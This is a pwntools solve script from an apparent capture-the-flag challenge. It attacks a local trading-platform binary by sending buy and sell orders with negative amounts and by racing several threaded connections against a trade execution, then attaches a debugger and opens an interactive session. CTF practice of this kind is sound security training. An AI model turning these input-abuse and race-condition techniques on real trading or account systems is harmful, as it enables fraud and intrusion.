#This solve3.py was created during verification after the competition.

from pwn import *
import random
import threading

elf_file = FILENAME = './deenzone'
elf = context.binary = ELF(elf_file)

#context.log_level = 'debug'



class CycliStr:
    def __init__(self) -> None:
        self.count = 0
    def __str__(self):
        buf = str(self.count)
        self.count += 1
        buf = buf.ljust(100, 'A')
        return buf
    def __add__(self, other):
        return str(self) + str(other)


conn_id = {}

def connect(token=b'test'):
    r = remote('127.0.0.1', 8080)
    r.sendlineafter(b':', token)
    return r

def create(un, pw, rr):
    print(f"[{conn_id[rr]}] create({un!r}, {pw!r})")
    rr.sendlineafter(b'> ', b'1')
    rr.sendlineafter(b'> ', un.encode())
    rr.sendlineafter(b'> ', pw.encode())

def login(un, pw, rr):
    print(f"[{conn_id[rr]}] login({un!r}, {pw!r})")
    rr.sendlineafter(b'> ', b'2')
    rr.sendlineafter(b'> ', un.encode())
    rr.sendlineafter(b'> ', pw.encode())

def buy(ticker, amount, price, rr):
    print(f"[{conn_id[rr]}] buy({ticker!r}, {amount!r}, {price!r})")
    rr.sendlineafter(b'> ', b'1')
    rr.sendlineafter(b'> ', ticker.encode())
    rr.sendlineafter(b'> ', str(amount).encode())
    rr.sendlineafter(b'> ', str(price).encode())

def sell(ticker, amount, price, rr):
    print(f"[{conn_id[rr]}] sell({ticker!r}, {amount!r}, {price!r})")
    rr.sendlineafter(b'> ', b'2')
    rr.sendlineafter(b'> ', ticker.encode())
    rr.sendlineafter(b'> ', str(amount).encode())
    rr.sendlineafter(b'> ', str(price).encode())

def preference(mode, rr):
    print(f"[{conn_id[rr]}] preference({mode!r})")
    rr.sendlineafter(b'> ', b'7')
    rr.sendlineafter(b'> ', str(mode).encode())


def update_detector(r):
    r.recvuntil(b'> ')
    checked_trades = set()
    is_first = True
    while True:
        data = r.recvuntil(b'> ')
        data = data[:data.rindex(b'1) Buy')]
        trades = data.split(b'------------------------------\n')
        for trade in trades:
            if trade in checked_trades: continue
            checked_trades.add(trade)
            if is_first: continue
            print(f"[{conn_id[r]}] recent trade update detected {len(checked_trades)}")
            print(trade)
        is_first = False

def cmd_5_sender(r):
    while True:
        r.sendline(b'5')




randstr = str(CycliStr())
print(f"{randstr=}")

r = connect()
conn_id[r] = 1
create('admin', 'admin', r)
login('admin', 'admin', r)

buy('1', -1000000, 100, r)
buy('Ramon Pena', 18, 100, r)

for i in range(5):
    sell('Ramon Pena', 1, 7, r)

for i in range(46):
    sell(randstr + str(i), -1000, 100000000, r)

for i in range(46):
    sell(randstr + str(i), 1, 1, r)
    buy(randstr + str(i), 1, 1, r)


r2 = connect()
conn_id[r2] = 2
create('admin2', 'admin2', r2)
login('admin2', 'admin2', r2)

r3 = connect()
conn_id[r3] = 3
create('admin3', 'admin3', r3)
login('admin3', 'admin3', r3)

r4 = connect()
conn_id[r4] = 4
create('admin4', 'admin4', r4)
login('admin4', 'admin4', r4)

gdb.attach(r)
preference(4, r2)
# preference(4, r3)
# preference(4, r4)

create('aaaaaa', 'aaaaa', r)
create('aaaaaa1', 'aaaaa', r)
create('aaaaa1a', 'aaaaa', r)
create('aaaa1aa', 'aaaaa', r)


rx2 = threading.Thread(target=update_detector, args=(r2,))
rx4 = threading.Thread(target=update_detector, args=(r4,))
tx2 = threading.Thread(target=cmd_5_sender, args=(r2,))
tx4 = threading.Thread(target=cmd_5_sender, args=(r4,))

# TradingPlatform::listTrades
rx2.start()
rx4.start()
tx2.start()
tx4.start()

# prepare for sell('Ramon Pena', 1, 7, r)
r.sendlineafter(b'> ', b'2')
r.sendlineafter(b'> ', b'Ramon Pena')
r.sendlineafter(b'> ', b'1')

sleep(3)

# execute sell('Ramon Pena', 1, 7, r)
# TradingEngine::execute
r.sendline(b'7')

# rx2.join()
# rx4.join()
# tx2.join()
# tx4.join()

sleep(3)

r.interactive()
